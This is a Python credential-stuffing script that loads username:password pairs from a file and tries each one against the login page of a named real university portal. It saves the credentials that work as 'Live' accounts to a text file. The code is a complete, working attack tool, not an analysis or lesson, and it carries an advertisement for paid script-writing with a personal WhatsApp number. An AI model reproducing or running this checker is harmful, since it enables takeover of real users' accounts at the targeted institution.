# Coded by: YutixCode
# Remember my Name!

YutixCode = """
	Open jasa bikin script murah
	Hubungi: 085759655315 [wa]
			"""

import os
import requests as req
from bs4 import BeautifulSoup as bs

red    = '\033[91m'
green  = '\033[92m'
yellow = '\033[93m'
blue   = '\033[94m'
purple = '\033[95m'
cyan   = '\033[96m'
white  = '\033[97m'

def run(path, YutixCode):
	if os.path.exists(path) == True:
		with open(path, 'r') as list:
			num   = 0
			loged = []
			error = []
			lines = list.readlines()
			print(f'\n{white}Starting ...')
			for line in lines:
				usr = line.split(':')[0]
				pwd = line.split(':')[1]
				url = 'https://inspire.unsrat.ac.id:443/login/autentikasi'
				dat = { 'username': usr.strip(),
						'password': pwd.strip() }
				raw = req.post(url, data=dat).text
				num +=1
				YutixCode = """
					Open jasa bikin script murah
					Hubungi: 085759655315 [wa]
							"""
				try:
					res = bs(raw,'html.parser').findAll('div')[3].find('h2').get_text()
					rep = res.replace("!", "").replace(" ", "").replace("\n", "")
					gas = rep.split(',')[1]
					print(f'{white}{num}> {cyan}{usr.strip()}:{pwd.strip()}')
					loged.append(line.split())
				except AttributeError:
					print(f'{white}{num}> {red}{usr.strip()}:{pwd.strip()}')
					error.append(num)
			with open('usrat.txt', 'a') as save:
				for i in loged:
					save.write(f'{i}\n')
					
			print(f'\n{white}usrat:')
			print(f' {white}> {green}Live: {white}{len(loged)}')
			print(f' {white}> {red}Dead: {white}{len(error)}')
			print(f"\nLive data has been saved in {yellow}'usrat.txt'")
	else:
		exit(f" > {red}Sorry, file {yellow}'{path}'{red} not found :(")

def main(YutixCode):
	os.system('clear')
	print(f'{cyan}UBED\n{yellow}')
	path = input(f' > {white}Filepath: {yellow}')
	run(path, YutixCode)

Yutixcode = """
	Open jasa bikin script murah
	Hubungi: 085759655315 [wa]
			"""

if __name__ == '__main__':
	main(YutixCode)
